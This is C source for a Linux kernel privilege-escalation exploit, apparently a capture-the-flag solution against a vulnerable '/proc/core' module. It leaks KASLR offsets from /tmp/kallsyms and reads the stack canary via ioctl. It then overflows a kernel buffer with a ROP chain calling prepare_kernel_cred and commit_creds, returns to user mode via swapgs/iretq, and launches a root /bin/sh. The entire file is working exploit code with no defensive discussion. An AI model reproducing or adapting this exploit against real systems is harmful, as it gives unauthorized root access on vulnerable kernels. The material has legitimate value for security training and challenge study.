#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

unsigned long long commit_creds = 0, prepare_kernel_cred = 0;	// address of to key function
const unsigned long long commit_creds_base = 0xFFFFFFFF8109C8E0;

const unsigned long long swapgs_popfq_ret = 0xffffffff81a012da;
const unsigned long long movrdirax_callrdx = 0xffffffff8101aa6a;
const unsigned long long poprdx_ret = 0xffffffff810a0f49;
const unsigned long long poprdi_ret = 0xffffffff81000b2f;
const unsigned long long poprcx_ret = 0xffffffff81021e53;
const unsigned long long iretq = 0xFFFFFFFF81A00987;

int fd = 0;	// file pointer of process 'core'

void saveStatus();
void get_function_address();
void core_read(char* buf);
void change_off(int off);
void core_copy_func(unsigned long long nbytes);
void print_binary(char* buf, int length);
void shell();

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void core_read(char* buf){
	ioctl(fd, 0x6677889B, buf);
}

void change_off(int off){
	ioctl(fd, 0x6677889C, off);
}

void core_copy_func(unsigned long long nbytes){
	ioctl(fd, 0x6677889A, nbytes);
}

// This function is used to get the addresses of two key functions from /tmp/kallsyms
void get_function_address(){
	FILE* sym_table = fopen("/tmp/kallsyms", "r");	// including all address of kernel functions
	if(sym_table == NULL){
		printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
		exit(1);
	}
	unsigned long long addr = 0;
	char type[0x10];
	char func_name[0x100];
	// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
	while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
		if(commit_creds && prepare_kernel_cred)		// two addresses of key functions are all found, return directly.
			return;
		if(!strcmp(func_name, "commit_creds")){		// function "commit_creds" found
			commit_creds = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
		}else if(!strcmp(func_name, "prepare_kernel_cred")){
			prepare_kernel_cred = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
		}
	}
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
	int index = 0;
	char output_buffer[80];
	memset(output_buffer, '\0', 80);
	memset(output_buffer, ' ', 0x10);
	for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
		char temp_buffer[0x10];
		memset(temp_buffer, '\0', 0x10);
		sprintf(temp_buffer, "%#5x", index);
		strcpy(output_buffer, temp_buffer);
		output_buffer[5] = ' ';
		output_buffer[6] = '|';
		output_buffer[7] = ' ';
		for(int j=0; j<16; j++){
			if(index+j >= length)
				sprintf(output_buffer+8+3*j, "   ");
			else{
				sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
				if(!isprint(buf[index+j]))
					output_buffer[58+j] = '.';
				else
					output_buffer[58+j] = buf[index+j];
			}
		}
		output_buffer[55] = ' ';
		output_buffer[56] = '|';
		output_buffer[57] = ' ';
		printf("%s\n", output_buffer);
		memset(output_buffer+58, '\0', 16);
		index += 16;
	}
}

void shell(){
	if(getuid()){
		printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
		exit(1);
	}
	printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
	system("/bin/sh");
	exit(0);
}

int main(){
	saveStatus();
	fd = open("/proc/core", 2);		// open the process
	if(!fd){
		printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
		exit(1);
	}
	char buffer[0x100] = {0};
	get_function_address();		// get addresses of two key function
	
	unsigned long long base_offset = commit_creds - commit_creds_base;
	printf("\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n", base_offset);
	
	change_off(0x40);			// change the offset so that we can get canary later
	core_read(buffer);			// get canary
	
	printf("\033[34m\033[1m[*] Contents in buffer here:\033[0m\n");	// print content in buffer
	print_binary(buffer, 0x40);
	
	unsigned long long canary = ((size_t*)&buffer)[0];
	printf("\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n", canary);
	
	size_t ROP[100] = {0};
	memset(ROP, 0, 800);
	int idx = 0;
	for(int i=0; i<10; i++)
		ROP[idx++] = canary;
	ROP[idx++] = poprdi_ret + base_offset;
	ROP[idx++] = 0;			// rdi -> 0
	ROP[idx++] = prepare_kernel_cred;
	ROP[idx++] = poprdx_ret + base_offset;
	ROP[idx++] = poprcx_ret + base_offset;
	ROP[idx++] = movrdirax_callrdx + base_offset;
	ROP[idx++] = commit_creds;
	ROP[idx++] = swapgs_popfq_ret + base_offset;	// step 1 of returning to user mode: swapgs
	ROP[idx++] = 0;
	ROP[idx++] = iretq + base_offset;				// step 2 of returning to user mode: iretq
	// after the iretq: return address, user cs, user rflags, user sp, user ss
	ROP[idx++] = (unsigned long long)shell;
	ROP[idx++] = user_cs;
	ROP[idx++] = user_rflags;
	ROP[idx++] = user_sp;
	ROP[idx++] = user_ss;
	
	printf("\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n");
	print_binary((char*)ROP, 0x100);
	
	write(fd, ROP, 0x800);
	core_copy_func(0xffffffffffff0100);
	return 0;
}
